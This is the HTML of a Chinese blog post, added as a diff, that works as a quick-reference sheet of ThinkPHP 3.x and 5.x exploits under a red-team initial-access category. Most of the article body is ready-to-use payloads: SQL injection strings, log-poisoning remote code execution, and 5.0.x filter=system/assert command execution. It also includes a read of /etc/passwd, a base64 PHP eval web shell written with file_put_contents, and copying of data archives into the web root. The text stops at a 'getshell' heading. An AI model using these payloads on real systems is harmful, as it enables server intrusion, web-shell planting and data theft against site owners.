@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32-next.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16-next.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fz1lin.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ThinkPHP 3.x ，5.x 漏洞相关的RCE，只包含命令执行POC或者EXP。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 3.x ，5.x 漏洞速查">
+<meta property="og:url" content="https://fz1lin.com/2022/429639226/index.html">
+<meta property="og:site_name" content="丰梓林的博客">
+<meta property="og:description" content="ThinkPHP 3.x ，5.x 漏洞相关的RCE，只包含命令执行POC或者EXP。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fz1lin.com/2022/429639226/image-20220218132319732.png">
+<meta property="og:image" content="https://fz1lin.com/2022/429639226/image-20220218134539894.png">
+<meta property="article:published_time" content="2022-02-20T08:40:53.000Z">
+<meta property="article:modified_time" content="2022-02-20T08:56:46.750Z">
+<meta property="article:author" content="fz1lin">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fz1lin.com/2022/429639226/image-20220218132319732.png">
+
+
+<link rel="canonical" href="https://fz1lin.com/2022/429639226/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fz1lin.com/2022/429639226/","path":"2022/429639226/","title":"ThinkPHP 3.x ，5.x 漏洞速查"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ThinkPHP 3.x ，5.x 漏洞速查 | 丰梓林的博客</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SHBHTBP9QE"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-SHBHTBP9QE","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?94d58b4f069475a3f156286ffb096bc8"></script>
+
+
+<link rel="dns-prefetch" href="https://blog-api-25jf3kruh-fz1lin.vercel.app/">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="丰梓林的博客" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">丰梓林的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">想做一个剑客，但手里没有合适的剑</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">20</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a></li>
+        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+        <li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+        <li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-comment fa-fw"></i>留言</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="nav-text">ThinkPHP 版本探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-3-2-3-%E6%BC%8F%E6%B4%9E"><span class="nav-text">ThinkPHP 3.2.3 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-x-RCE-%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.2.x  RCE 漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-x-%E6%BC%8F%E6%B4%9E"><span class="nav-text">ThinkPHP 5.x 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-1"><span class="nav-text">Thinkphp 5.0.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-2"><span class="nav-text">Thinkphp 5.0.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-3"><span class="nav-text">Thinkphp 5.0.3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-4"><span class="nav-text">Thinkphp 5.0.4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-5"><span class="nav-text">Thinkphp 5.0.5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-6"><span class="nav-text">Thinkphp 5.0.6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-7"><span class="nav-text">Thinkphp 5.0.7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-8"><span class="nav-text">Thinkphp 5.0.8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-9"><span class="nav-text">Thinkphp 5.0.9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-10"><span class="nav-text">Thinkphp 5.0.10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-11"><span class="nav-text">Thinkphp 5.0.11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-12"><span class="nav-text">Thinkphp 5.0.12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-13"><span class="nav-text">Thinkphp 5.0.13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-14"><span class="nav-text">Thinkphp 5.0.14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-15"><span class="nav-text">Thinkphp 5.0.15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-16"><span class="nav-text">Thinkphp 5.0.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-17"><span class="nav-text">Thinkphp 5.0.17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-18"><span class="nav-text">Thinkphp 5.0.18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-19"><span class="nav-text">Thinkphp 5.0.19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-20"><span class="nav-text">Thinkphp 5.0.20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-21"><span class="nav-text">Thinkphp 5.0.21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-22"><span class="nav-text">Thinkphp 5.0.22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-0-23"><span class="nav-text">Thinkphp 5.0.23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-1-18"><span class="nav-text">Thinkphp 5.1.18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thinkphp-5-1-29"><span class="nav-text">Thinkphp 5.1.29</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fz1lin"
+      src="/images/avatar1.gif">
+  <p class="site-author-name" itemprop="name">fz1lin</p>
+  <div class="site-description" itemprop="description">愿所有美好都如期而至</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fz1lin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fz1lin" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/fengzilin.blog@gmail.com" title="E-Mail → fengzilin.blog@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fz1lin" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fz1lin" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fz1lin.com/2022/429639226/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.gif">
+      <meta itemprop="name" content="fz1lin">
+      <meta itemprop="description" content="愿所有美好都如期而至">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="丰梓林的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP 3.x ，5.x 漏洞速查
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-02-20 16:40:53 / 修改时间：16:56:46" itemprop="dateCreated datePublished" datetime="2022-02-20T16:40:53+08:00">2022-02-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/" itemprop="url" rel="index"><span itemprop="name">红队打点</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2022/429639226/#waline-comments" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" id="/2022/429639226/" data-xid="/2022/429639226/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>16k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">ThinkPHP 3.x ，5.x 漏洞相关的RCE，只包含命令执行POC或者EXP。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="ThinkPHP-版本探测"><a href="#ThinkPHP-版本探测" class="headerlink" title="ThinkPHP 版本探测"></a>ThinkPHP 版本探测</h2><p>使用浏览器插件判断是 ThinkPHP </p>
+<p><img src="/2022/429639226/image-20220218132319732.png" alt="image-20220218132319732"> </p>
+<p>提交任意字符，会爆出框架版本</p>
+<p> <img src="/2022/429639226/image-20220218134539894.png" alt="image-20220218134539894"> </p>
+<p>如果版本隐藏，可以考虑盲打。使用payload即可，作为打点漏洞，需要知道，该漏洞是否有利用面，也就是进一步的深入，能否获取内网获取权限。</p>
+<h2 id="ThinkPHP-3-2-3-漏洞"><a href="#ThinkPHP-3-2-3-漏洞" class="headerlink" title="ThinkPHP 3.2.3 漏洞"></a>ThinkPHP 3.2.3 漏洞</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/ThinkPHP/</span>POC</span><br></pre></td></tr></table></figure>
+
+<p>order by 注入漏洞</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">order</span>[updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>update 注入漏洞</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">money</span>[]=<span class="number">1123</span>&amp;user=liao&amp;id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span>%<span class="number">20</span>and%<span class="number">20</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select%<span class="number">20</span>user()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-x-RCE-漏洞"><a href="#3-2-x-RCE-漏洞" class="headerlink" title="3.2.x  RCE 漏洞"></a>3.2.x  RCE 漏洞</h3><p>关闭 debug</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>读取日志文件</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\C</span>ommon<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21_06_30.log</span><br></pre></td></tr></table></figure>
+
+<p>开启debug</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>文件默认路径</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\H</span>ome<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Home/21_06_30.log</span><br></pre></td></tr></table></figure>
+
+<p>传入恶意文件，传入文件地址</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./test.txt</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;info</span>[<span class="string">_filename</span>]=.\</span><br></pre></td></tr></table></figure>
+
+<h2 id="ThinkPHP-5-x-漏洞"><a href="#ThinkPHP-5-x-漏洞" class="headerlink" title="ThinkPHP 5.x 漏洞"></a>ThinkPHP 5.x 漏洞</h2><p>tp框架系列中，5.0.x 跟 5.1.x 中，各个系列里的poc是几乎为通用的<br>5.0.1中某个poc在5.0.3中也是可以用的，也就是说当我们碰到5.0.8的时候，可以尝试用5.0.1<br>或 5.0.5等 5.0.x 系列的poc去尝试使用，5.1.x 系列同理</p>
+<p>漏洞成因</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">路由控制不严谨，默认不开启强制路由，从而可以任意调用Thinkphp的类库</span><br><span class="line"></span><br><span class="line">主要有两种方法，</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">Request</span>中的变量覆盖导致RCE</span><br><span class="line"><span class="number">2.</span>路由控制不严谨导致的RCE</span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-1"><a href="#Thinkphp-5-0-1" class="headerlink" title="Thinkphp 5.0.1"></a>Thinkphp 5.0.1</h3><p>（1）判断是否存在漏洞</p>
+<p>poc1</p>
+<pre><code>http://wwww.com/public
+
+s=phpinfo()&amp;_method=__construct&amp;filter=assert
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1
+</code></pre>
+<p>poc2</p>
+<pre><code>http:/xxxx.com/?s=index/index/index
+
+s=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system
+</code></pre>
+<p>（2）深入利用</p>
+<p>使用post提交</p>
+<p>1、使用assert函数</p>
+<pre><code>s=phpinfo()&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<p>2、include函数，可以根据此函数查看一些文件及其配置</p>
+<pre><code>s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<p>3、file_put_contents函数，可以直接写入文件</p>
+<pre><code>s=file_put_contents(&#39;/data/wwwroot/test.com/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<p>4、读取文件</p>
+<pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccess
+s=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert
+
+//ps:如果不加.. 请加上完整路径
+</code></pre>
+<p>5、var_dump函数，可以查看该路径下的文件，文件夹</p>
+<pre><code>s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<p>6、复制文件</p>
+<pre><code>s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/test.com/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser
+</code></pre>
+<h3 id="Thinkphp-5-0-2"><a href="#Thinkphp-5-0-2" class="headerlink" title="Thinkphp 5.0.2"></a>Thinkphp 5.0.2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
